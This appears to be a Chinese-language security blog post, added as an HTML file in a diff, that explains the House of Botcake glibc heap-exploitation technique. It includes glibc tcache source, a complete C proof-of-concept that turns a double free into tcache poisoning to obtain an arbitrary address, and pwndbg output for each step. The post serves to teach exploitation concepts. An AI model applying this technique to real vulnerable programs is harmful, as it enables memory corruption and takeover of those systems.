@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="House Of Botcakeglibc2.29～glibc2.31，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 house of botcake，他的本质也是通过 UAF 来达到绕过的目的 利用场景：  glibc &gt; 2.25（有 tcache） d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House Of Botcake-原理">
+<meta property="og:url" content="http://example.com/2022/04/06/House%20Of%20Botcake-%E5%8E%9F%E7%90%86/index.html">
+<meta property="og:site_name" content="Pwn进你的心">
+<meta property="og:description" content="House Of Botcakeglibc2.29～glibc2.31，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 house of botcake，他的本质也是通过 UAF 来达到绕过的目的 利用场景：  glibc &gt; 2.25（有 tcache） d">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-06T06:38:15.000Z">
+<meta property="article:modified_time" content="2022-04-06T06:40:00.110Z">
+<meta property="article:author" content="yhellow">
+<meta property="article:tag" content="House Of Botcake">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/04/06/House%20Of%20Botcake-%E5%8E%9F%E7%90%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>House Of Botcake-原理 | Pwn进你的心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pwn进你的心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/06/House%20Of%20Botcake-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          House Of Botcake-原理
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-04-06 14:38:15 / Modified: 14:40:00" itemprop="dateCreated datePublished" datetime="2022-04-06T14:38:15+08:00">2022-04-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>4.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="House-Of-Botcake"><a href="#House-Of-Botcake" class="headerlink" title="House Of Botcake"></a>House Of Botcake</h2><p>glibc2.29～glibc2.31，tcache加入了 key 值来进行 double free 检测，以至于在旧版本时的直接进行 double free 变的无效，所以自然就有了绕过方法，绕过方法其中比较典型的就是 <strong>house of botcake</strong>，他的本质也是通过 <strong>UAF</strong> 来达到绕过的目的</p>
+<p>利用场景：</p>
+<ul>
+<li>glibc &gt; 2.25（有 tcache）</li>
+<li>double free</li>
+</ul>
+<hr>
+<h2 id="glibc2-31下的Tcache检查"><a href="#glibc2-31下的Tcache检查" class="headerlink" title="glibc2.31下的Tcache检查"></a>glibc2.31下的Tcache检查</h2><p>对于每一个 tcache 中的chunk，增加了一个key指针，用于指向所属的 tcache 结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>  <span class="comment">//链表指针，对应chunk中的fd字段</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>  <span class="comment">//指向所属的tcache结构体，对应chunk中的bk字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
+<p>当chunk被放入时会设置key指针：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;  <span class="comment">//设置所属的tcache</span></span><br><span class="line"> </span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//单链表头插法</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  </span><br><span class="line"> </span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]); <span class="comment">//计数增加</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ptmalloc 使用了一种更机智的方法，在不影响效率的前提下，完成了对double free的检查：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"><span class="comment">//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查</span></span><br><span class="line"><span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来</span></span><br><span class="line"><span class="comment">    如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))<span class="comment">//剪枝</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">//通过检查，放入tcahce中</span></span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put(p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单来说：</p>
+<ul>
+<li>在 free chunk 被放入 tcache 时，程序会设置一个 key 值</li>
+<li>每次程序把 new free chunk 放入 tcache 前，都会检查一下它是否携带有 key 值</li>
+<li>注意：key 值原本的位置是用户数据区（可以认为是随机值），有极小的概率会触发检查报错</li>
+</ul>
+<p>这些检查导致我们不能 free 任何一个已经在tcache中的chunk，绕过的方法有两个：</p>
+<ul>
+<li>想办法修改 key 字段</li>
+<li>使用 fastbin double free</li>
+</ul>
+<h2 id="House-Of-Botcake-利用姿势"><a href="#House-Of-Botcake-利用姿势" class="headerlink" title="House Of Botcake 利用姿势"></a>House Of Botcake 利用姿势</h2><p>首先填充 tcache bin 链表，然后使用 malloc 从 tcache bin 链表中取出一个 chunk，然后通过二次 free 将 victim chunk 加入 tcache bin 链表，然后利用堆块重叠将 double free 块的fd指针覆写为目标位置，再次 malloc 即可控制到目标位置，达到任意写操作 </p>
+<p>核心点为：</p>
+<ul>
+<li>合并 chunk1 chunk2 进 unsortedbins</li>
+<li>将 chunk2 链进 tcache</li>
+<li>从 chunk1 分配一个大chunk造成 overlapped 到 chunk2 修改其 fd </li>
+</ul>
+<p>其实就是利用了 tcachebin 和 unsortedbin 之间的相对独立性，使一个 chunk 在 unsortedbin 中的同时还可以在 tcachebin 中（fastbin对此就有相对完善的检查，不会出现这种情况）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;House of botcake Poc\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁用缓冲并使_FILE_IO不影响堆</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备目标</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;目标地址是 %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;堆布局构造&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;申请7个 chunks(malloc(0x100)) 用于稍后填充tcache bin链表.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;为之后的合并申请一个 prev chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;申请用于double free的 victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;申请一个填充chunk防止top chunk合并.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;接下来可以造成堆块重叠&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: 填充 tcache bin 链表&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free victim chunk 并链接到 unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free prev chunk 使它和 victim chunk 合并.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: 使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;double free 利用完成\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;tcache 毒化&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;现在 victim chunk 被包含在一个更大的已释放块中，可以通过利用块重叠进行 tcache 毒化&quot;</span>); </span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;将 victim chunk 的 fd 指针覆写为目标位置&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/* 这里只能直接修改,模拟覆盖的过程 */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc申请到目标位置.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 chunk 位于 %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;已控制目标位置!\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Step 1: 填充 tcache bin 链表</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x405d10</span> —▸ <span class="number">0x405c00</span> —▸ <span class="number">0x405af0</span> —▸ <span class="number">0x4059e0</span> —▸ <span class="number">0x4058d0</span> —▸ <span class="number">0x4057c0</span> —▸ <span class="number">0x4056b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x4052a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>Step 2: free victim chunk 并链接到 unsorted bin</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x405f20</span> —▸ <span class="number">0x7ffff7facbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x405f20</span> <span class="comment">/* victim(head) */</span></span><br></pre></td></tr></table></figure>
+<p>Step 3: free prev chunk 使它和 victim chunk 合并</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x405e10</span> —▸ <span class="number">0x7ffff7facbe0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x405e10</span></span><br></pre></td></tr></table></figure>
+<p>Step 4: 使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">6</span>]: <span class="number">0x405c00</span> —▸ <span class="number">0x405af0</span> —▸ <span class="number">0x4059e0</span> —▸ <span class="number">0x4058d0</span> —▸ <span class="number">0x4057c0</span> —▸ <span class="number">0x4056b0</span> ◂— <span class="number">0x0</span> <span class="comment">/* 原本tcache的第一个chunk被申请了 */</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x4052a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x405f30</span> —▸ <span class="number">0x405c00</span> —▸ <span class="number">0x405af0</span> —▸ <span class="number">0x4059e0</span> —▸ <span class="number">0x4058d0</span> —▸ <span class="number">0x4057c0</span> —▸ <span class="number">0x4056b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x410</span> [  <span class="number">1</span>]: <span class="number">0x4052a0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>Step 5: 将 victim chunk 的 fd 指针覆写为目标位置</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x405f30</span> —▸ <span class="number">0x7fffffffded0</span> —▸ <span class="number">0x400040</span> ◂— <span class="number">0x400000006</span></span><br></pre></td></tr></table></figure>
+<p>虽然和 tcache Double free 的流程有些不同（先填满 tcache 然后再 fastbin 上进行 Double free，再次申请，使得 fast chunk 被链入 tcache），但最后都可以申请到目标地址</p>
+<h2 id="版本对-House-Of-Botcake-的影响"><a href="#版本对-House-Of-Botcake-的影响" class="headerlink" title="版本对 House Of Botcake 的影响"></a>版本对 House Of Botcake 的影响</h2><p>House Of Botcake 就是为了对付高libc版本而产生的技术</p>
+<p>至少在 libc-2.25 ~ libc-2.31 都可以适应</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/House-Of-Botcake/" rel="tag"><i class="fa fa-tag"></i> House Of Botcake</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/04/House%20Of%20Husk-statically-64/" rel="prev" title="House Of Husk-statically-64">
+      <i class="fa fa-chevron-left"></i> House Of Husk-statically-64
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/09/Ucore-Lab1/" rel="next" title="Ucore-Lab1">
+      Ucore-Lab1 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Botcake"><span class="nav-number">1.</span> <span class="nav-text">House Of Botcake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#glibc2-31%E4%B8%8B%E7%9A%84Tcache%E6%A3%80%E6%9F%A5"><span class="nav-number">2.</span> <span class="nav-text">glibc2.31下的Tcache检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-Of-Botcake-%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF"><span class="nav-number">3.</span> <span class="nav-text">House Of Botcake 利用姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E5%AF%B9-House-Of-Botcake-%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="nav-number">4.</span> <span class="nav-text">版本对 House Of Botcake 的影响</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">113</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">79</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
